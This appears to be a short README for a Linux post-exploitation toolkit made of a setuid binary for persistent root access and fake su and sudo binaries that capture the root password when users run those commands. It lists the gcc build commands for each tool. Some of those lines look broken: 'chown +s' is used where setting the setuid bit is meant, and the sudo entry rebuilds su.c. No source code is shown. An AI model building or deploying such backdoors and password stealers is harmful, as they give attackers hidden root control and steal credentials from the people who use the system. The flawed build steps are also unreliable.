Info:
=============
<pre>
Suite of binnary files:
setuid - persistent root privilege
su - steal root password when user use su command
sudo - steal root password when user use sudo command
</pre>
Build:
=============

- setuid:
gcc ./setuid.c -o setuid ; sudo chown +s ./setuid
- su:
gcc ./su.c -o su
- sudo:
gcc ./su.c -o su
